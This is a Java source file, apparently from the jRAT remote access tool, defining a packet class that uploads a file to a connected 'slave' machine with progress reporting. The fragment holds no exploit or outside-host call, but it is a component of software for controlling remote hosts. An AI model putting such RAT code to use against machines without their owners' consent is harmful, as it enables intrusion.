package se.jrat.client.packets.outgoing;

import java.io.DataOutputStream;
import java.io.File;

import se.jrat.client.Slave;
import se.jrat.client.ui.frames.FrameFileTransfer;
import se.jrat.client.ui.frames.FrameRemoteFiles;
import se.jrat.common.io.FileIO;
import se.jrat.common.io.TransferListener;
import se.jrat.common.utils.MathUtils;


public class Packet42TakeFile extends AbstractOutgoingPacket {

	private String dir;
	private String name;
	private File file;

	public Packet42TakeFile(String dir, String name, File file) {
		this.dir = dir;
		this.name = name;
		this.file = file;
	}

	@Override
	public void write(final Slave slave, DataOutputStream dos) throws Exception {
		slave.writeLine(dir);
		slave.writeLine(name);

		final FrameFileTransfer frame = FrameFileTransfer.instance;
		final FrameRemoteFiles frame2 = FrameRemoteFiles.instances.get(slave);

		FileIO fileio = new FileIO();
		fileio.writeFile(file, slave.getSocket(), slave.getDataOutputStream(), slave.getDataInputStream(), new TransferListener() {
			public void transferred(long sent, long bytesSent, long totalBytes) {
				if (frame != null) {
					frame.reportProgress(file.getAbsolutePath(), MathUtils.getPercentFromTotal((int) bytesSent, (int) totalBytes), (int) bytesSent, (int) totalBytes);
				}
				if (frame2 != null) {
					frame2.reportProgress(file.getAbsolutePath(), MathUtils.getPercentFromTotal((int) bytesSent, (int) totalBytes), (int) bytesSent, (int) totalBytes);
				}
			}
		}, slave.getKey());
	}

	@Override
	public byte getPacketId() {
		return 42;
	}

}
